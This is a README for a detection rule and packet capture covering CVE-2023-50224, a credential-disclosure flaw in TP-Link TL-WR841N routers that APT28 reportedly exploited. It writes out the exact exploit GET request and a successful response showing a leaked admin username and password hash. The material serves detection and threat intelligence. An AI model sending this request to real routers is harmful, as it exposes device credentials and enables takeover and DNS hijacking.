This folder contains the PacketSmith [Yara-X detection rule](https://github.com/Netomize/RFiles/blob/main/cve_2023_50224/tp_link_wr841n_cve_2023_50224.yar) and a [pcap](https://github.com/Netomize/RFiles/blob/main/cve_2023_50224/tp_link_wr841n_cve_2023_50224_get_request.pcap) for the CVE-2023-50224 vulnerability in the TP-Link TL-WR841N devices.

This vulnerability was used by the APT28 - a GRU threat actor to compromise TP-Link TL-WR841N devices and perform malicious DNS hijacking operations.

A specially crafted GET request is sent to the vulnerable device over port 80, for the purpose of disclosing login credentials stored in the file `/tmp/dropbear/dropbearpwd`. The PoC was made public by [Swings](https://bestwing.me/tp-link-wr841n-router-cve-analysis.html).

To exploit the vulnerability, a request similar to the following is sent to the vulnerable device:

```
GET /loginFs/./dropbear/dropbearpwd HTTP/1.1
Host: 192.168.60.129
User-Agent: Mozilla/5.0
Accept-Encoding: gzip, deflate
Accept: */*
Connection: keep-alive
Referer: http://192.168.60.129:80/
```

In case exploitation is successful, the server responds with:

```
HTTP/1.1 200 OK
Server: Router Webserver
Connection: Keep-Alive
Keep-Alive:
Persist:
WWW-Authenticate: Basic realm="TP-LINK Wireless N Router WR841N"
Content-Length: 56
Content-Type: text/plain

username:admin
password:21232f297a57a5a743894a0e4a801fc
```

**References**:

1. [APT28 exploit routers to enable DNS hijacking operations](https://www.ncsc.gov.uk/news/apt28-exploit-routers-to-enable-dns-hijacking-operations)
2. [Russian GRU Exploiting Vulnerable Routers to Steal Sensitive Information](https://www.ic3.gov/PSA/2026/PSA260407)
3. [CVE-2023-50224 Detail](https://nvd.nist.gov/vuln/detail/cve-2023-50224)
4. [TP-Link WR841N router CVE-2023-50224 and CVE-2025-9377 - PoC](https://bestwing.me/tp-link-wr841n-router-cve-analysis.html)
